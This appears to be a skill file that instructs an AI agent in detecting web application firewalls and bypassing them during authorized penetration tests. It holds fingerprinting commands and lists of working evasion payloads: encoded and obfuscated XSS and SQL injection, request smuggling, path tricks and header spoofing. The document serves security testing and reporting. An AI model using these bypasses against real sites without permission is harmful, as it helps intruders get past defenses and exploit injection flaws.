---
name: waf-detection-bypass
description: "Detect and bypass WAFs during authorized testing. Trigger: identifying WAF vendors, selecting bypass payloads, or assessing attack surface behind WAFs."
license: Apache-2.0
metadata:
  author: gentleman-programming
  version: "1.0"
---

# WAF Detection & Bypass

Identify Web Application Firewalls, understand their rulesets, and test bypass techniques during authorized penetration tests to assess the real security posture behind the WAF layer.

## When to Use This Skill

Use this skill when you need to:
- **Identify** which WAF protects a target application
- **Bypass** WAF rules to test the actual application security
- **Assess** whether WAF-only defenses are sufficient
- **Demonstrate** that WAF evasion is possible in pentest reports
- **Test** WAF rules during blue team/purple team exercises
- **Understand** why certain payloads are blocked and adapt

> **Authorization Required:** Only use these techniques during authorized penetration tests, bug bounty programs with explicit WAF testing scope, or on systems you own. Unauthorized WAF bypass attempts are illegal.

## WAF Detection

### Fingerprinting Techniques

#### 1. Response Header Analysis

```bash
# Check common WAF headers
curl -sI https://target.com | grep -iE "server|x-powered|x-cdn|x-cache|cf-ray|x-sucuri|x-akamai"

# Common WAF headers:
# Server: cloudflare          → Cloudflare
# X-Sucuri-ID: ...            → Sucuri
# X-CDN: Incapsula            → Imperva/Incapsula
# X-Akamai-Transformed: ...   → Akamai
# Server: AkamaiGHost         → Akamai
# X-SL-CompState: ...         → Silverline (F5)
# Server: BigIP               → F5 BIG-IP
```

#### 2. Error Page Fingerprinting

Send an obvious attack payload and analyze the block page:

```bash
# Trigger WAF block
curl -s "https://target.com/?id=<script>alert(1)</script>"
curl -s "https://target.com/?id=1' OR 1=1--"
curl -s "https://target.com/?id=../../../etc/passwd"
```

#### 3. Cookie Analysis

```bash
# WAF-specific cookies
# __cfduid, cf_clearance         → Cloudflare
# incap_ses_*, visid_incap_*     → Imperva
# _citrix_ns_id_*                → Citrix NetScaler
# ts*, BIGipServer*              → F5 BIG-IP
# ak_bmsc, bm_sv                → Akamai Bot Manager
```

### WAF Signature Database

| WAF | Detection Headers | Block Page Markers | Cookies |
|-----|-------------------|-------------------|---------|
| **Cloudflare** | `cf-ray`, `Server: cloudflare` | "Attention Required", "cloudflare" | `__cfduid`, `cf_clearance` |
| **AWS WAF** | `x-amzn-RequestId` | "403 Forbidden" (generic) | None specific |
| **Akamai** | `X-Akamai-Transformed`, `Server: AkamaiGHost` | "Access Denied", reference ID | `ak_bmsc` |
| **Imperva/Incapsula** | `X-CDN: Incapsula` | "Request unsuccessful. Incapsula" | `incap_ses_*`, `visid_incap_*` |
| **F5 BIG-IP ASM** | `Server: BigIP` | "The requested URL was rejected" | `TS*`, `BIGipServer*` |
| **ModSecurity** | None (transparent) | "Forbidden" + ModSecurity ID | None specific |
| **Sucuri** | `X-Sucuri-ID`, `X-Sucuri-Cache` | "Access Denied - Sucuri" | `sucuri_cloudproxy_*` |
| **Barracuda** | `Server: Barracuda` | "Barracuda Web Application Firewall" | `barra_*` |
| **Fortinet FortiWeb** | `Server: FortiWeb` | "Server Busy" or custom | None specific |
| **Citrix NetScaler** | `Via: NS-CACHE` | "ns_af" in response | `citrix_ns_id` |
| **Azure WAF** | None specific | "Azure WAF" reference | None specific |
| **Google Cloud Armor** | None specific | "Our systems have detected unusual traffic" | None specific |
| **Fastly** | `Via: 1.1 varnish`, `X-Served-By` | Custom per customer | None specific |
| **Radware AppWall** | None specific | "Unauthorized Activity" | None specific |
| **DDoS-Guard** | `Server: ddos-guard` | DDoS-Guard branded page | `__ddg*` |
| **Wordfence** | None specific | "Wordfence" branded block | `wfwaf-*` |

### Automated Detection

```bash
# wafw00f - WAF detection tool
pip install wafw00f
wafw00f https://target.com

# Nmap WAF detection
nmap -p 80,443 --script http-waf-detect target.com
nmap -p 80,443 --script http-waf-fingerprint target.com
```

## Bypass Techniques

### Category 1: Encoding Bypasses

```yaml
url_encoding:
  description: "Encode characters WAF looks for"
  examples:
    - original: "<script>alert(1)</script>"
      bypass: "%3Cscript%3Ealert(1)%3C/script%3E"
    - original: "' OR 1=1--"
      bypass: "%27%20OR%201%3D1--"

double_url_encoding:
  description: "Encode the percent signs themselves"
  examples:
    - original: "<script>"
      bypass: "%253Cscript%253E"
  note: "Works when app decodes twice but WAF only decodes once"

unicode_encoding:
  description: "Use Unicode representations"
  examples:
    - original: "<script>"
      bypass: "＜script＞"  # Fullwidth characters
    - original: "' OR"
      bypass: "＇ OR"
  note: "Effective against WAFs that don't normalize Unicode"

html_entity_encoding:
  description: "Use HTML entities in XSS contexts"
  examples:
    - original: "<img src=x onerror=alert(1)>"
      bypass: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
    - original: "javascript:alert(1)"
      bypass: "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)"
```

### Category 2: Case and Syntax Variation

```yaml
case_switching:
  xss:
    - "<ScRiPt>alert(1)</ScRiPt>"
    - "<IMG SRC=x OnErRoR=alert(1)>"
  sqli:
    - "' oR 1=1--"
    - "' UnIoN SeLeCt 1,2,3--"

comment_injection:
  sqli:
    - "UN/**/ION SEL/**/ECT 1,2,3--"
    - "1' /*!50000OR*/ 1=1--"
    - "' OR/**/ 1=1--"
  note: "MySQL inline comments with version numbers"

whitespace_alternatives:
  sqli:
    - "' OR%091=1--"         # Tab instead of space
    - "' OR%0a1=1--"         # Newline
    - "' OR%0d1=1--"         # Carriage return
    - "' OR%0c1=1--"         # Form feed
    - "' OR%a01=1--"         # Non-breaking space (MySQL)
```

### Category 3: Payload Alternatives

```yaml
xss_tag_alternatives:
  description: "Use HTML tags that WAFs might not block"
  payloads:
    - "<svg onload=alert(1)>"
    - "<body onload=alert(1)>"
    - "<details open ontoggle=alert(1)>"
    - "<marquee onstart=alert(1)>"
    - "<video src=x onerror=alert(1)>"
    - "<audio src=x onerror=alert(1)>"
    - "<input onfocus=alert(1) autofocus>"
    - "<select onfocus=alert(1) autofocus>"
    - "<textarea onfocus=alert(1) autofocus>"
    - "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>"

xss_event_handlers:
  description: "Less common event handlers"
  payloads:
    - "onanimationend"
    - "onanimationiteration"
    - "onwebkitanimationend"
    - "ontransitionend"
    - "onpointerover"
    - "onfocusin"

sqli_function_alternatives:
  description: "Alternative SQL functions"
  payloads:
    concat_alternatives:
      - "CONCAT(0x41, 0x42)"           # Standard
      - "0x41 || 0x42"                 # PostgreSQL
      - "GROUP_CONCAT(column)"          # MySQL
      - "STRING_AGG(column, ',')"       # PostgreSQL/MSSQL
    sleep_alternatives:
      - "SLEEP(5)"                      # MySQL
      - "pg_sleep(5)"                   # PostgreSQL
      - "WAITFOR DELAY '00:00:05'"      # MSSQL
      - "DBMS_LOCK.SLEEP(5)"            # Oracle
    version_detection:
      - "@@version"                     # MySQL/MSSQL
      - "version()"                     # PostgreSQL
      - "SELECT banner FROM v$version"  # Oracle
```

### Category 4: HTTP Smuggling and Chunking

```yaml
chunked_transfer:
  description: "Split payload across chunks to bypass inspection"
  technique: |
    POST /vulnerable HTTP/1.1
    Transfer-Encoding: chunked

    5
    <scri
    3
    pt>
    9
    alert(1)
    a
    </script>
    0

http_parameter_pollution:
  description: "Same parameter multiple times, different servers handle differently"
  examples:
    - url: "/search?q=harmless&q=<script>alert(1)</script>"
      note: "Apache uses last, IIS uses all, Tomcat uses first"
    - url: "/search?q=1&q=UNION&q=SELECT&q=1,2,3--"
      note: "WAF may only inspect first parameter value"

content_type_confusion:
  description: "Send body in unexpected Content-Type"
  examples:
    - technique: "Send JSON body with application/x-www-form-urlencoded header"
    - technique: "Send URL-encoded body with multipart/form-data header"
    - technique: "Use charset variations: Content-Type: application/json; charset=ibm037"
```

### Category 5: Path and Request Manipulation

```yaml
path_manipulation:
  description: "Alter URL path to bypass path-based WAF rules"
  techniques:
    - "/./admin" instead of "/admin"
    - "//admin" double slash
    - "/admin%20" trailing encoded space
    - "/admin..;/" path traversal normalization
    - "/Admin" case variation (if backend is case-insensitive)
    - "/api/v2/../v1/admin" path traversal to reach blocked endpoint

http_method_override:
  description: "Override HTTP method via headers"
  techniques:
    - "X-HTTP-Method-Override: PUT"
    - "X-HTTP-Method: DELETE"
    - "X-Method-Override: PATCH"
  note: "Send as POST but override to method WAF doesn't inspect"

ip_rotation:
  description: "Distribute requests across source IPs"
  techniques:
    - "X-Forwarded-For: 1.2.3.4"
    - "X-Real-IP: 1.2.3.4"
    - "X-Originating-IP: 1.2.3.4"
    - "True-Client-IP: 1.2.3.4"
  note: "Only works if WAF trusts these headers (misconfiguration)"
```

## WAF-Aware Testing Strategy

### Phase 1: Identify WAF

```
1. Send normal requests → establish baseline response
2. Send obvious attack payloads → trigger WAF block
3. Analyze block page, headers, cookies
4. Confirm WAF vendor and version if possible
5. Document WAF behavior (block vs rate-limit vs captcha)
```

### Phase 2: Characterize Rules

```
1. Test basic payloads per category (XSS, SQLi, LFI, RCE)
2. Identify which SPECIFIC strings/patterns are blocked
3. Test encoding variations → find what passes through
4. Test via different injection points (URL, body, headers, cookies)
5. Document: blocked patterns vs. allowed patterns
```

### Phase 3: Select Bypasses

```
1. Based on WAF vendor → select known bypass techniques
2. Start with encoding bypasses (least suspicious)
3. Try payload alternatives (different tags, functions)
4. Try request-level bypasses (chunking, HPP, method override)
5. Document: which bypasses work, which don't
```

### Phase 4: Test Real Vulnerabilities

```
1. Use working bypasses to test actual application logic
2. Remember: WAF bypass is a MEANS, not the finding
3. The REAL finding is the underlying vulnerability
4. Report both: "Application has SQLi, WAF provides partial mitigation"
5. Recommend fixing the application code, not just relying on WAF
```

## Reporting WAF Findings

```markdown
### WAF Assessment

**WAF Identified:** [Vendor/Product]
**Detection Method:** [Headers/Block page/Cookies]
**Bypass Achieved:** [Yes/No/Partial]

### Bypass Details

| Attack Type | Blocked Payload | Bypass Payload | Result |
|-------------|-----------------|----------------|--------|
| XSS | `<script>alert(1)</script>` | `<svg onload=alert(1)>` | Bypass successful |
| SQLi | `' OR 1=1--` | `' /*!50000OR*/ 1=1--` | Bypass successful |
| LFI | `../../etc/passwd` | `....//....//etc/passwd` | Blocked |

### Recommendation

WAF provides defense-in-depth but should NOT be the sole protection.
The following application-level vulnerabilities exist behind the WAF:
1. [Vulnerability details with bypass proof]

**Fix the application code.** WAF rules can always be bypassed given enough time.
```

## Quality Checklist

- [ ] WAF identified with multiple detection methods
- [ ] Testing performed only with explicit authorization
- [ ] Bypass attempts documented (successful AND failed)
- [ ] Underlying vulnerabilities reported separately from WAF bypass
- [ ] Report recommends application-level fixes, not just WAF tuning
- [ ] Rate limiting respected during testing (don't DoS the WAF)
- [ ] Bypasses verified with ai-pentesting-validation pipeline
- [ ] Chain opportunities with bypassed payloads explored

## Integration Points

- **ai-pentesting-validation** - Validate findings discovered behind WAF
- **exploit-chain-patterns** - WAF bypass is often step 1 in a chain
- **detection-engineer** - Create WAF rules / Sigma rules for bypass attempts
- **pentest-orchestrator** - WAF detection is an early phase in orchestrated testing

## Validation

To verify this skill works correctly:

1. **Load test**: Confirm the skill loads without frontmatter parsing errors.
2. **Signature test**: Verify the WAF signature database table renders correctly with all vendor entries.
3. **Bypass test**: Check that all 5 bypass category YAML blocks are syntactically valid.
4. **Strategy test**: Validate the 4-phase WAF-aware testing strategy is complete and sequential.
5. **Integration test**: Confirm referenced skills (ai-pentesting-validation, exploit-chain-patterns, detection-engineer, pentest-orchestrator) exist.
